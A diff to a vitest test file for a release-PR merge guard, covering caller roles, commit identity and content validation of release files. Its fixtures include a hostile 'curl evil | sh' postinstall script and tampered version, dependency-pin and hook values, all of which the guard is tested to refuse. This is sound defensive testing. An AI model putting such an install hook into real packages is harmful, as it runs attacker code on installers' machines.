@@ -4,12 +4,16 @@
  */
 
 import { describe, expect, it } from 'vitest';
-import { mkdtempSync, readFileSync, readdirSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, readdirSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import {
   commitAuthorRefusal,
   defaultAuditWriter,
+  hasActiveTaskSentinel,
+  jsonContentRefusal,
+  jsonDiffPaths,
+  tomlContentRefusal,
   isReleaseArtifactPath,
   nonReleaseFiles,
   RELEASE_BOT_EMAIL,
@@ -34,8 +38,17 @@ const YAML = 'spec:\n  governance:\n    allowMerge: never\n    releaseAuthors: [
 interface Fixture {
   pr?: Record<string, unknown>;
   prAfter?: Record<string, unknown>;
-  commits?: Array<{ sha: string; login: string | null; email: string }>;
-  files?: string[];
+  commits?: Array<{
+    sha: string;
+    login: string | null;
+    email: string;
+    clogin?: string | null;
+    cemail?: string;
+    verified?: boolean;
+  }>;
+  files?: Array<string | { path: string; status?: string; previous?: string }>;
+  /** Per-path overrides: base/head file text, or a head contents-API type. */
+  blobs?: Record<string, { base?: string; head?: string; headType?: string; fail?: boolean }>;
   required?: Array<{ name: string; state: string }>;
   shaChecks?: Array<{ name: string; status: string; conclusion: string | null }>;
   mergeFails?: boolean;
@@ -53,6 +66,25 @@ function pr(over: Record<string, unknown> = {}): Record<string, unknown> {
     files: [],
     ...over,
   };
+}
+
+function defaultText(path: string, head: boolean): string {
+  const v = head ? '0.2.0' : '0.1.0';
+  if (path.endsWith('CHANGELOG.md')) return head ? '# Changelog\n\n## 0.2.0\n' : '# Changelog\n';
+  if (path === '.release-please-manifest.json') return JSON.stringify({ a: v, 'b/c': v });
+  if (path.endsWith('plugin.json') && path.startsWith('ai-sdlc-plugin')) {
+    return JSON.stringify({
+      name: 'p',
+      version: v,
+      runtimeDependencies: {
+        '@ai-sdlc/orchestrator': `>=${v} <1.0.0`,
+        '@ai-sdlc/pipeline-cli': `>=${v} <1.0.0`,
+        '@ai-sdlc/plugin-mcp-server': '0.9.2',
+      },
+      hooks: { PreToolUse: [] },
+    });
+  }
+  return JSON.stringify({ name: 'x', version: v, scripts: { build: 'tsc' } });
 }
 
 function makeRunner(f: Fixture = {}) {
@@ -74,14 +106,47 @@ function makeRunner(f: Fixture = {}) {
       ];
       return ok(
         commits
-          .map((c) => JSON.stringify({ sha: c.sha, login: c.login, email: c.email }))
+          .map((c) =>
+            JSON.stringify({
+              sha: c.sha,
+              login: c.login,
+              email: c.email,
+              clogin: c.clogin === undefined ? c.login : c.clogin,
+              cemail: c.cemail ?? c.email,
+              verified: c.verified ?? false,
+            }),
+          )
           .join('\n'),
+      );
+    }
+    if (key.includes('api user')) return ok('deefactorial\n');
+    if (key.includes('/contents/')) {
+      const m = /contents\/(.+)\?ref=([0-9a-f]+)/.exec(key)!;
+      const [, path, ref] = m;
+      const o = f.blobs?.[path];
+      if (o?.fail) return { stdout: '', stderr: 'HTTP 404', code: 1 };
+      const isHead = ref === HEAD;
+      const text = isHead
+        ? (o?.head ?? defaultText(path, true))
+        : (o?.base ?? defaultText(path, false));
+      return ok(
+        JSON.stringify({
+          type: isHead ? (o?.headType ?? 'file') : 'file',
+          content: Buffer.from(text).toString('base64'),
+        }),
       );
     }
     if (key.includes('/compare/')) {
       return ok(
         (f.files ?? ['CHANGELOG.md', 'pipeline-cli/package.json', '.release-please-manifest.json'])
-          .map((p) => JSON.stringify({ filename: p, status: 'modified' }))
+          .map((p) => {
+            const o = typeof p === 'string' ? { path: p } : p;
+            return JSON.stringify({
+              filename: o.path,
+              status: o.status ?? 'modified',
+              previous_filename: o.previous,
+            });
+          })
           .join('\n'),
       );
     }
@@ -227,17 +292,19 @@ describe('runReleaseMerge: refusals name the failed check', () => {
     expect(reason).toMatch(/check "required checks".*ai-sdlc\/pr-ready=FAILURE/);
   });
 
-  it('red required check also refuses arming; pending does not', async () => {
+  it('arm needs the same readiness as merge: red AND pending both refuse', async () => {
     const red = await refused(
       { shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'completed', conclusion: 'failure' }] },
       { mode: 'arm' },
     );
     expect(red).toMatch(/check "required checks"/);
-    const { result } = run(
+    const pending = await refused(
       { shaChecks: [{ name: 'ai-sdlc/pr-ready', status: 'in_progress', conclusion: null }] },
       { mode: 'arm' },
     );
-    expect((await result).armed).toBe(true);
+    expect(pending).toMatch(/not green/);
+    const notClean = await refused({ pr: pr({ mergeStateStatus: 'BLOCKED' }) }, { mode: 'arm' });
+    expect(notClean).toMatch(/CLEAN/);
   });
 
   it('merge mode refuses a pending check', async () => {
@@ -288,17 +355,46 @@ describe('caller role (mistake guard)', () => {
     expect(r.eligibility.eligible).toBe(false);
   });
 
-  it('resolveCallerRole: explicit env, active task => executor, bare => operator', () => {
-    expect(resolveCallerRole({ AI_SDLC_CALLER_ROLE: 'Planner' })).toBe('planner');
-    expect(resolveCallerRole({ AI_SDLC_ACTIVE_TASK_ID: 'AISDLC-1' })).toBe('executor');
-    expect(resolveCallerRole({})).toBe('operator');
+  it('resolveCallerRole: explicit env, active task => executor, otherwise undeterminable', () => {
+    const bare = mkdtempSync(join(tmpdir(), 'role-bare-'));
+    expect(resolveCallerRole({ AI_SDLC_CALLER_ROLE: 'Planner' }, bare)).toBe('planner');
+    expect(resolveCallerRole({ AI_SDLC_ACTIVE_TASK_ID: 'AISDLC-1' }, bare)).toBe('executor');
+    expect(resolveCallerRole({}, bare)).toBeNull();
   });
 
-  it('resolveReleaseGovernance: defaults, fallback to mergeAuthors, drops malformed entries', () => {
+  it('an .active-task sentinel in an ancestor makes the default role executor', () => {
+    const root = mkdtempSync(join(tmpdir(), 'role-sentinel-'));
+    writeFileSync(join(root, '.active-task'), 'AISDLC-1\n');
+    const nested = join(root, 'a', 'b');
+    mkdirSync(nested, { recursive: true });
+    expect(hasActiveTaskSentinel(nested)).toBe(true);
+    expect(resolveCallerRole({}, nested)).toBe('executor');
+    // explicit role still wins (mistake guard, not a boundary)
+    expect(resolveCallerRole({ AI_SDLC_CALLER_ROLE: 'operator' }, nested)).toBe('operator');
+  });
+
+  it('refuses when the role is undeterminable, before reading the PR', async () => {
+    const { result, calls } = run(
+      {},
+      { callerRole: undefined, cwd: mkdtempSync(join(tmpdir(), 'r-')) },
+    );
+    const saved = { ...process.env };
+    delete process.env.AI_SDLC_CALLER_ROLE;
+    delete process.env.AI_SDLC_ACTIVE_TASK_ID;
+    try {
+      const r = await result;
+      expect(r.eligibility.reason).toMatch(/role could not be determined/);
+      expect(calls.some((c) => c.includes('pr view'))).toBe(false);
+    } finally {
+      process.env = saved;
+    }
+  });
+
+  it('resolveReleaseGovernance: defaults, no mergeAuthors fallback, drops malformed entries', () => {
     expect(resolveReleaseGovernance('spec:\n  governance:\n    mergeAuthors: [octocat]\n')).toEqual(
       {
         roles: ['operator', 'planner'],
-        authors: ['octocat'],
+        authors: [],
       },
     );
     expect(
@@ -307,6 +403,180 @@ describe('caller role (mistake guard)', () => {
       ),
     ).toEqual({ roles: ['operator'], authors: ['ok'] });
     expect(resolveReleaseGovernance('')).toEqual({ roles: ['operator', 'planner'], authors: [] });
+  });
+
+  it('no releaseAuthors on main disables the path even when mergeAuthors is set', async () => {
+    const r = await run(
+      {},
+      { policyYaml: 'spec:\n  governance:\n    mergeAuthors: [deefactorial]\n' },
+    ).result;
+    expect(r.eligibility.eligible).toBe(false);
+    expect(r.eligibility.reason).toMatch(/releaseAuthors.*no\s+fallback to mergeAuthors/s);
+  });
+
+  it('planner is allowed; the executor refusal names the role and the allowed list', async () => {
+    const ok = await run({}, { callerRole: 'planner' }).result;
+    expect(ok.merged).toBe(true);
+    const denied = await run({}, { callerRole: 'executor' }).result;
+    expect(denied.eligibility.reason).toBe(
+      'release PR refused: caller role "executor" is not allowed to use --source-kind release ' +
+        '(governance.releaseMergeRoles: operator, planner)',
+    );
+  });
+
+  it('records the gh login in the audit record', async () => {
+    const { result, audit } = run();
+    await result;
+    expect(audit[0].ghLogin).toBe('deefactorial');
+    expect(audit[0].commitsVerified).toBe(false);
+  });
+});
+
+describe('file content validation', () => {
+  const refused = async (f: Fixture) => {
+    const { result, calls } = run(f);
+    const r = await result;
+    expect(r.eligibility.eligible).toBe(false);
+    expect(r.merged).toBe(false);
+    expect(calls.some((c) => c.includes('pr merge'))).toBe(false);
+    return r.eligibility.reason;
+  };
+  const PLUGIN = 'ai-sdlc-plugin/plugin.json';
+
+  it('accepts version bumps and pin-sync runtimeDependencies changes', async () => {
+    const r = await run({
+      files: [
+        PLUGIN,
+        'ai-sdlc-plugin/.claude-plugin/plugin.json',
+        'ai-sdlc-plugin/mcp-server/package.json',
+      ],
+    }).result;
+    expect(r.merged).toBe(true);
+  });
+
+  it('refuses a plugin.json change outside version/pins (hooks)', async () => {
+    const base = defaultText(PLUGIN, false);
+    const head = JSON.stringify({ ...JSON.parse(defaultText(PLUGIN, true)), hooks: { evil: 1 } });
+    const reason = await refused({ files: [PLUGIN], blobs: { [PLUGIN]: { base, head } } });
+    expect(reason).toMatch(/ai-sdlc-plugin\/plugin\.json: key "hooks\.(evil|PreToolUse)" changed/);
+  });
+
+  it('refuses a package.json scripts addition', async () => {
+    const f = 'pipeline-cli/package.json';
+    const head = JSON.stringify({
+      name: 'x',
+      version: '0.2.0',
+      scripts: { build: 'tsc', postinstall: 'curl evil | sh' },
+    });
+    const reason = await refused({ files: [f], blobs: { [f]: { head } } });
+    expect(reason).toMatch(/pipeline-cli\/package\.json: key "scripts\.postinstall" changed/);
+  });
+
+  it('refuses a version field that is not a version, and a pin of the wrong shape', async () => {
+    const f = 'pipeline-cli/package.json';
+    const bad = JSON.stringify({ name: 'x', version: 'http://evil', scripts: { build: 'tsc' } });
+    expect(await refused({ files: [f], blobs: { [f]: { head: bad } } })).toMatch(/key "version"/);
+    const pin = JSON.parse(defaultText(PLUGIN, true));
+    pin.runtimeDependencies['@ai-sdlc/orchestrator'] = 'github:evil/x';
+    expect(
+      await refused({ files: [PLUGIN], blobs: { [PLUGIN]: { head: JSON.stringify(pin) } } }),
+    ).toMatch(/runtimeDependencies\.@ai-sdlc\/orchestrator/);
+  });
+
+  it('refuses a new key in the release-please manifest and unparsable content', async () => {
+    const f = '.release-please-manifest.json';
+    const head = JSON.stringify({ a: '0.2.0', 'b/c': '0.2.0', extra: '1.0.0' });
+    expect(await refused({ files: [f], blobs: { [f]: { head } } })).toMatch(/key "extra"/);
+    expect(await refused({ files: [f], blobs: { [f]: { head: '{not json' } } })).toMatch(
+      /not parseable JSON/,
+    );
+  });
+
+  it('refuses removed and renamed files', async () => {
+    expect(await refused({ files: [{ path: 'CHANGELOG.md', status: 'removed' }] })).toMatch(
+      /removal/,
+    );
+    expect(
+      await refused({
+        files: [{ path: 'CHANGELOG.md', status: 'renamed', previous: 'sdk-go/CHANGELOG.md' }],
+      }),
+    ).toMatch(/rename\/copy/);
+  });
+
+  it('refuses a symlink (even CHANGELOG.md) and a submodule', async () => {
+    expect(
+      await refused({
+        files: ['CHANGELOG.md'],
+        blobs: { 'CHANGELOG.md': { headType: 'symlink' } },
+      }),
+    ).toMatch(/is a "symlink"/);
+    expect(
+      await refused({
+        files: ['pipeline-cli/package.json'],
+        blobs: { 'pipeline-cli/package.json': { headType: 'submodule' } },
+      }),
+    ).toMatch(/is a "submodule"/);
+  });
+
+  it('fails closed when a blob cannot be fetched', async () => {
+    expect(
+      await refused({
+        files: ['pipeline-cli/package.json'],
+        blobs: { 'pipeline-cli/package.json': { fail: true } },
+      }),
+    ).toMatch(/could not fetch/);
+  });
+
+  it('CHANGELOG.md may change arbitrarily', async () => {
+    const r = await run({
+      files: ['CHANGELOG.md'],
+      blobs: { 'CHANGELOG.md': { head: 'anything at all\n<script>' } },
+    }).result;
+    expect(r.merged).toBe(true);
+  });
+
+  it('pyproject.toml: only the version line may change', () => {
+    const base = '[project]\nname = "x"\nversion = "0.1.0"\ndeps = []\n';
+    expect(tomlContentRefusal('p.toml', base, base.replace('0.1.0', '0.2.0'))).toBeNull();
+    expect(
+      tomlContentRefusal(
+        'p.toml',
+        base,
+        base.replace('deps = []', 'deps = ["evil"]').replace('0.1.0', '0.2.0'),
+      ),
+    ).toMatch(/other than the "version" key/);
+  });
+
+  it('jsonDiffPaths flags array length and structural changes', () => {
+    expect(jsonDiffPaths({ a: [1] }, { a: [1, 2] }).map((d) => d.path.join('.'))).toEqual(['a']);
+    expect(jsonContentRefusal('package/package.json', '{"a":1}', '{"a":1,"b":2}')).toMatch(/"b"/);
+  });
+});
+
+describe('commit identity', () => {
+  it('unsigned commits are accepted (real release commits are unsigned) but recorded', async () => {
+    const { result, audit } = run({
+      commits: [{ sha: HEAD, login: 'deefactorial', email: 'e@x.y', verified: false }],
+    });
+    expect((await result).merged).toBe(true);
+    expect(audit[0].commitsVerified).toBe(false);
+  });
+
+  it('refuses a commit whose committer is not an allowed identity', async () => {
+    const { result } = run({
+      commits: [{ sha: HEAD, login: 'deefactorial', email: 'e@x.y', clogin: 'mallory' }],
+    });
+    const r = await result;
+    expect(r.eligibility.reason).toMatch(/committer is "mallory"/);
+  });
+
+  it('refuses an unlinked committer that is not the release bot', async () => {
+    const { result } = run({
+      commits: [
+        { sha: HEAD, login: 'deefactorial', email: 'e@x.y', clogin: null, cemail: 'x@evil.dev' },
+      ],
+    });
+    expect((await result).eligibility.reason).toMatch(/unlinked committer "x@evil\.dev"/);
   });
 });
 
@@ -336,11 +606,24 @@ describe('allowlist and helpers', () => {
   });
 
   it('commitAuthorRefusal accepts allowed logins and the unlinked release bot only', () => {
+    const base = { committerLogin: null, committerEmail: RELEASE_BOT_EMAIL, verified: false };
     expect(
       commitAuthorRefusal(
         [
-          { sha: 'a'.repeat(40), authorLogin: 'DeeFactorial', authorEmail: 'q' },
-          { sha: 'b'.repeat(40), authorLogin: null, authorEmail: RELEASE_BOT_EMAIL.toUpperCase() },
+          {
+            ...base,
+            sha: 'a'.repeat(40),
+            authorLogin: 'DeeFactorial',
+            authorEmail: 'q',
+            committerLogin: 'deefactorial',
+            committerEmail: 'q',
+          },
+          {
+            ...base,
+            sha: 'b'.repeat(40),
+            authorLogin: null,
+            authorEmail: RELEASE_BOT_EMAIL.toUpperCase(),
+          },
         ],
         ['deefactorial'],
       ),
